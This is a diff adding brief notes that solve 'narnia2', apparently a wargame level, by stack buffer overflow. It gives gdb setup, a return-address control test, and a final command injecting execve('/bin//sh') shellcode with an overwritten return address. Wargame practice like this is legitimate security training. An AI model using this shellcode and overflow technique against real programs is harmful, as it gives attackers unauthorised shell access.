@@ -1,0 +1,27 @@
+Buffer Overflow and Inject Shell code
+
+Unset env variables inside gdb
+-------------------------------
+unset environment LINES
+unset environment COLUMNS
+
+First check if we can control return address
+--------------------------------------------
+run `python -c 'print "A"*132 + "\xef\xbe\xad\xde"'`
+
+Check stack
+-----------
+x/40xw $esp-136
+
+Inject shell code
+-----------------
+run `python -c 'print "A"*56 + "\x31\xc0\x50\x68\x2f\x2f\x73" + "\x68\x68\x2f\x62\x69\x6e\x89" +  "\xe3\x89\xc1\x89\xc2\xb0\x0b" + "\xcd\x80\x31\xc0\x40\xcd\x80" + "B"*48 + "\xef\xbe\xad\xde"'`
+
+Place return address somewhere between As (0xffffd508)
+------------------------------------------------------
+run `python -c 'print "A"*56 + "\x31\xc0\x50\x68\x2f\x2f\x73" + "\x68\x68\x2f\x62\x69\x6e\x89" +  "\xe3\x89\xc1\x89\xc2\xb0\x0b" + "\xcd\x80\x31\xc0\x40\xcd\x80" + "B"*48 + "\x08\xd5\xff\xff"'`
+
+Final command
+-------------
+./narnia2 `python -c 'print "A"*56 + "\x31\xc0\x50\x68\x2f\x2f\x73" + "\x68\x68\x2f\x62\x69\x6e\x89" +  "\xe3\x89\xc1\x89\xc2\xb0\x0b" + "\xcd\x80\x31\xc0\x40\xcd\x80" + "B"*48 + "\x08\xd5\xff\xff"'`
+
